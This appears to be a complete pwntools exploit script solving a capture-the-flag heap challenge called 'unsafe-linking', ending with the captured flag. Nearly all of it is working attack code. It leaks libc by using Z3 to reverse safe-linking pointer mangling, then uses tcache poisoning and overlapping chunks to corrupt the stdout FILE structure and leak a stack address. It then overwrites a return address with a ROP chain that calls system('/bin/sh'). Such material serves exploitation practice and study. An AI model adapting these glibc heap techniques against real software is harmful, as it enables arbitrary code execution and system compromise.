from pwn import *
from z3 import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./unsafe-linking', '''
    continue
''')

# p = remote('recruit.osiris.bar', 21006)

def create_note_without_secret(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0/1)\n', b'0')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.sendlineafter(b'?\n', str(size).encode())
    p.sendafter(b':\n', data)

def create_note_with_secret(idx, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0/1)\n', b'1')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.sendafter(b':\n', data)

def delete_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'?\n', str(idx).encode())

def read_node(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.recvuntil(b'Secret ')
    leak1 = int(p.recvuntil(b"(").decode()[:-1], 16)
    p.recvuntil(b"off= ")
    leak2 = int(p.recvuntil(b")").decode()[:-1], 16)
    return leak1, leak2

def solve(secret, offset):
    # This is a Z3 solver to retrieve the content of the note
    protected = BitVec('protected', 64)
    random = BitVec('random', 64)
    s = Solver()
    s.add((random&0xfffffff000000000)==0)
    s.add((protected^random)==secret)
    s.add((random-(protected>>12))==offset)
    assert s.check() == sat
    return s.model()[protected].as_long()

def arbitrary_free(addr_to_free):
    # This is a method to free an arbitrary address
    create_note_without_secret(12, 0x20, b'\n')
    create_note_without_secret(13, 0x20, b'\n')
    delete_note(12)
    delete_note(13)
    create_note_with_secret(14, p64(addr_to_free))
    delete_note(12)

glibc_e = ELF('./libc.so.6')
glibc_r = ROP('./libc.so.6')

# Stage 1: Leak libc base address (fill the tcache with 7 chunks and let the following freed chunks be in the fastbins to trigger the consolidation when malloc a large chunk that can fit in the unsorted bin)
create_note_with_secret(0, b'\n')
create_note_with_secret(1, b'\n')
create_note_with_secret(2, b'\n')
create_note_without_secret(3, 0x410, b'\n')
create_note_with_secret(4, b'\n')
delete_note(0)
delete_note(1)
delete_note(2)
delete_note(3)
delete_note(4)
create_note_with_secret(0, b'\n')
create_note_with_secret(1, b'\n')
create_note_with_secret(2, b'\n')
create_note_without_secret(3, 0x450, b'\n')
delete_note(3)
create_note_with_secret(4, b'\n')
secret, offset = read_node(4)
glibc_base_addr = solve(secret, offset)-0x21ace0
log.info(f'libc base address: {hex(glibc_base_addr)}')

# Stage 2: Create mmap region (mmap overlapping chunks; mmap address is within the libc region)
create_note_without_secret(5, 0x20000, b'A'*8+p64(0x221)+b'B'*0x18+(p64(0x41)+b'C'*0x38)*8+b'\n')
mmap_base_addr = glibc_base_addr-0x23ff0
log.info(f'mmap base address: {hex(mmap_base_addr)}')

# Stage 3: Leak stack address (overlapping chunks with tcache poisoning; attack the File Structure in the stdout to print the environ stack address)
arbitrary_free(mmap_base_addr+0x8+0x8)
arbitrary_free(mmap_base_addr+0x8+0x8+0x18+0x8+0x40)
arbitrary_free(mmap_base_addr+0x8+0x8+0x18+0x8)
create_note_without_secret(6, 0x218, b'D'*0x18+p64(0x41)+p64(((mmap_base_addr+0x8+0x8+0x18+0x8)>>12)^(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']))+b'\n')
create_note_without_secret(7, 0x38, b'\n')
create_note_without_secret(8, 0x38, p64(0xfbad2887)+p64(glibc_base_addr+glibc_e.symbols.environ)+p64(glibc_base_addr+glibc_e.symbols.environ)+p64(glibc_base_addr+glibc_e.symbols.environ)+p64(glibc_base_addr+glibc_e.symbols.environ)+p64(glibc_base_addr+glibc_e.symbols.environ+0x8)+p64(glibc_base_addr+glibc_e.symbols.environ+0x8))
create_return_addr = u64(p.recvuntil(b'======= NYUSec =======')[0:6].ljust(8, b'\x00'))-0x140
log.info(f'create return address: {hex(create_return_addr)}')

# Stage 4: Pop a shell (overlapping chunks with tcache poisoning; attack the return address of create function to ROP to call system("/bin/sh"))
chain = [
    glibc_r.rdi.address+glibc_base_addr,
    next(glibc_e.search(b"/bin/sh"))+glibc_base_addr,
    glibc_r.ret.address+glibc_base_addr,
    glibc_e.symbols.system+glibc_base_addr
]
arbitrary_free(mmap_base_addr+0x8+0x8)
arbitrary_free(mmap_base_addr+0x8+0x8+0x18+0x8+0x40+0x40+0x40)
arbitrary_free(mmap_base_addr+0x8+0x8+0x18+0x8+0x40+0x40)
create_note_without_secret(9, 0x218, b'E'*(0x18+0x40+0x40)+p64(0x41)+p64(((mmap_base_addr+0x8+0x8+0x18+0x8+0x40+0x40)>>12)^(create_return_addr-0x8))+b'\n')
create_note_without_secret(10, 0x38, b'\n')
create_note_without_secret(11, 0x38, p64(0)+b"".join([p64(addr) for addr in chain])+b'\n')

p.interactive()

# flag{ea00610ef917558d1cffe6ce257279dcc8641b3d}
